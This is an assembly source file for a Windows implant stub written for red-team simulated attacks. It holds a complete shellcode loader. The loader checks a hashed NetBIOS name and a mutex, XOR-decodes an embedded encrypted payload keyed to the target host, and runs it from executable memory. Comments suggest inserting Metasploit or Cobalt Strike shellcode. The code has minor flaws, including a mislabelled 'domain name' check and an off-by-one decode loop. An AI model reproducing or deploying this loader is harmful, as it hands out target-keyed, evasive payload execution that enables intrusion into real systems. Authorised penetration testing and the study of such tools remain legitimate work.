; -----------------------------------------------------------------------------
; 
;  Implant Stub Code - MASM EXE
;  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
;  MWR InfoSecurity Ltd, MWR Labs
;
;  This code is designed to act as a basis for safer implants during simulated
;  attacks. 
;
;  Compile this by running 'makeit.bat' from the same drive as a masm32 installation.
; 
; -----------------------------------------------------------------------------

.586
.model flat,stdcall
option casemap:none

; -----------------------------------------------------------------------------
;  These includes are needed for the compiler and linker
; -----------------------------------------------------------------------------

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib           
includelib \masm32\lib\advapi32.lib           

; -----------------------------------------------------------------------------
;  MASM works by single-pass, so all functions need to be declared
;  in advance so that the lexcial analyser will work properly
; -----------------------------------------------------------------------------

CheckExecution PROTO 
MutexCheck PROTO
ExecuteShellcode PROTO
GetComputerInfo PROTO :DWORD
GenerateHash PROTO :DWORD,:DWORD

.data         
                     
; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
; and some experimentation. You shouldn't need to change this.
CNF_ComputerNamePhysicalNetBIOS           equ 4
CNF_ComputerNamePhysicalDnsHostname       equ 5
CNF_ComputerNamePhysicalDnsDomain         equ 6
CNF_ComputerNamePhysicalDnsFullyQualified equ 7

; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
; It identifies the constant needed to request a SHA1 hash from the Crypto API
MS_CALG_SHA1 equ 8004h    
MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)

; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
strMutexName  db  "Global\Stufus",0    

; The hash of the authorised NetBIOS computer name. Change this to the real hash.
; You can generate this with raw2src.py or manually if you prefer
hashSHA1ComputerName db 83,143,104,249,44,163,118,229,35,230,214,169,104,99,222,2,125,118,163,218

; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
; You can generate this with raw2src.py or manually if you prefer
shellcode db 138,100,243,32,88,135,130,212,241,84,161,152,161,7,85,115,77,253,213,214
          db 216,249,116,114,106,171,253,155,3,109,224,145,39,123,171,241,36,119,114,37
          db 178,239,227,149,8,135,253,160,31,109,130,129,16,98,52,137,55,110,40,128
          db 115,142,131,26,24,234,253,209,168,231,56,152,151,82,30,254,209,242,99,174
          db 84,78,167,244,45,100,157,17,24,154,242,129,29,130,85,88,89,119,72,188
          db 216,131,35,114,118,191,119,14,168,226,93,168,128,234,154,38,97,23,96,104
          db 91,166,188,112,201,42,180,141,173,168,216,69,58,139,65,253,130,137,42,159
          db 87,52,22,33,206,208,241,249,7,180,62,39,151,156,33,139,56,126,203,182
          db 63,175,41,145,31,145,88,129,75,147,165,204,26,83,5,138,33,82,169,83
          db 181,217,151,172,40,42,180,181,152,78,116,228,212,228,194,38,47,158,252,37
          db 172,112,0,138,116,131,86,141,3,170,183,203,0,67,147,85,47,30,214,169
          db 115,160,0,170,88,214,16,212,248,110,138,141,121,234,61,106,37,86,131,250
          db 59,175,6,150,91,203,24,140,77,129,190,137,26,22,176,106,25,86,193,191
          db 59,248,7,140,64,203,23,139,87,198,190,192,5,19,178,106,41,30,198,250
          db 98,70,224,181,8,131,255,4,18,52,188,233,59,50,140,253,173,71,99,138
          db 172,218,96
shellcodelen  equ  303

.data?
            
.code 
stufus:

; -----------------------------------------------------------------------------
;  Entry point
; -----------------------------------------------------------------------------
 
invoke CheckExecution       ; This does the main work
invoke ExitProcess, NULL    ; Exit cleanly when the time comes



; -----------------------------------------------------------------------------
; 
;  CheckExecution
;  This function does all of the work; it will go through the relevant checks
;  and execute the shellcode if they all pass.
; 
; -----------------------------------------------------------------------------

CheckExecution PROC uses esi edi

 ; ============================================================================
 ; 
 ; CHECK 1: NETBIOS NAME vs STORED HASH
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the raw computer name
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the computer name
 mov edi, eax           ; Contains the hash of the raw computer name
 invoke GlobalFree, esi ; Free the NETBIOS name buffer

 ; Now compare the hash of the name of the host against the stored hash
 push edi               ; Store a pointer to the raw computer name hash so we can clear it later
 mov ecx, MS_CALG_SHA1_HASHSIZE ; ecx = length of the hash
 cld                            ; Clear the direction flag (i.e. left-to-right comparison)
 mov esi, offset hashSHA1ComputerName ; The calculated hash is in edi, the stored hash is now in esi
 repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
 jnz badhash                    ; If they are different, the hash was incorrect



 ; ============================================================================
 ; 
 ; CHECK 2: MUTEX
 ;
 ; ============================================================================

 ; Check to see whether the implant is already running or not
 invoke MutexCheck   ; Perform the mutex check
 test eax, eax       ; If return value is 0, don't continue
 jz done



 ; ============================================================================
 ; 
 ; CHECK 3: XORing shellcode against hash of domain name
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the FQDN
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the FQDN
 mov edi, eax           ; Contains the hash of the FQDN
 invoke GlobalFree, esi ; Free the buffer

 ; Now loop through the shellcode xoring it with the hash values (repeating hash
 ; values if necessary)
 ; ecx = The loop counter (i.e. position in the shellcode)
 ; edi = Pointer to the hash
 ; eax = The position in the hash
 ; esi = Pointer to the shellcode
 ; edx = 'Working' register (to store the current character)
 mov ecx, 0
 mov eax, 0
 mov esi, offset shellcode
 xor edx, edx

startloop:
 mov dh, byte ptr [esi+ecx]
 xor dh, byte ptr [edi+eax]
 mov byte ptr [esi+ecx], dh 
 .if eax==MS_CALG_SHA1_HASHSIZE-1      ; If we are at the end of the hash, start again
    xor eax, eax
 .else
    inc eax
 .endif
 .if ecx<shellcodelen                ; If we are at the end of the shellcode, its done
    inc ecx
    jmp startloop                    ; If not, increase the counter by one and start again
 .endif
 invoke GlobalFree, edi              ; Free the hash buffer


 ; ============================================================================
 ; 
 ; Finally execute the shellcode
 ;
 ; ============================================================================

 invoke ExecuteShellcode

; If the hash was incorrect, jump here because we
; need to free the generated hash memory
badhash:
 pop edi
 invoke GlobalFree, edi

done:
 ret
    
CheckExecution ENDP



; -----------------------------------------------------------------------------
; 
;  GetComputerInfo
;  This function retrieves information about the computer (e.g. its name)
;  and returns a buffer to it. Caller needs to free it when done.
; 
; -----------------------------------------------------------------------------

GetComputerInfo PROC uses esi reqinfo:DWORD
LOCAL lsize:DWORD

    mov lsize, 0
    invoke GetComputerNameEx, reqinfo, NULL, addr lsize ; Find out how large this string actually is
    inc lsize
    invoke GlobalAlloc, GPTR, lsize                     ; Allocate the memory needed to store the name
    test eax, eax                                       ; Make sure the function worked
    jz done
    mov esi, eax
    invoke GetComputerNameEx, reqinfo, esi, addr lsize  ; Actually retrieve it
    test eax, eax
    jz done
    mov eax, esi 
done:
    ret
GetComputerInfo ENDP



; -----------------------------------------------------------------------------
; 
;  MutexCheck
;  This function attempts to create the mutex stored in 'strMutexName'. It will
;  return 0 in eax if the mutex already existed and return -1 if it did not.
;
;  0 = Don't go any further, its already running.
;  1 = Continue execution.
; 
; -----------------------------------------------------------------------------

MutexCheck PROC 
 invoke CreateMutex, NULL, TRUE, addr strMutexName
 .if eax==NULL
      xor eax, eax
      ret
 .else
      invoke GetLastError
      .if eax==ERROR_ALREADY_EXISTS
          xor eax, eax
          ret
      .else
          mov eax, -1
          ret
      .endif
 .endif
MutexCheck ENDP



; Generate hash using CryptoAPI
GenerateHash PROC uses esi ptrString:DWORD,stringlength:DWORD
LOCAL hProv:DWORD
LOCAL hHash:DWORD
LOCAL dwHashSize:DWORD
LOCAL dwHashSizeLen:DWORD

 mov dwHashSizeLen, 4 ; 32-bit :)
 invoke CryptAcquireContext, addr hProv, NULL, NULL, PROV_RSA_AES, NULL
 .if eax!=NULL
   invoke CryptCreateHash, hProv, MS_CALG_SHA1, NULL, NULL, addr hHash
   .if eax!=NULL
     invoke CryptHashData,hHash, ptrString, stringlength, NULL
     .if eax!=NULL
       invoke CryptGetHashParam, hHash, HP_HASHSIZE, addr dwHashSize, addr dwHashSizeLen, NULL
       .if eax!= NULL
         invoke GlobalAlloc, GPTR, dwHashSize
         .if eax!=NULL
           mov esi, eax
           invoke CryptGetHashParam, hHash, HP_HASHVAL, esi, addr dwHashSize, NULL
           .if (eax!=NULL && dwHashSize==MS_CALG_SHA1_HASHSIZE)
             mov eax, esi  ; Hash is now stored in esi
           .endif
         .endif
       .endif 
     .endif
     push eax
     invoke CryptDestroyHash, hHash
     pop eax
   .endif
   push eax
   invoke CryptReleaseContext, hProv, NULL
   pop eax
 .endif
 ret
GenerateHash ENDP



; -----------------------------------------------------------------------------
; 
;  ExecuteShellcode
;  This function will execute the shellcode provided
; 
; -----------------------------------------------------------------------------

ExecuteShellcode PROC uses esi edi
  ; Allocate the memory for the shellcode
  invoke VirtualAlloc, NULL, shellcodelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE
  .if eax!=0
    mov edi, eax
    push eax
    mov esi, offset shellcode
    mov ecx, shellcodelen
    cld
    rep movsb
    pop edx
    call edx ; The shellcode should take over from here
  .endif
ExecuteShellcode ENDP

End stufus
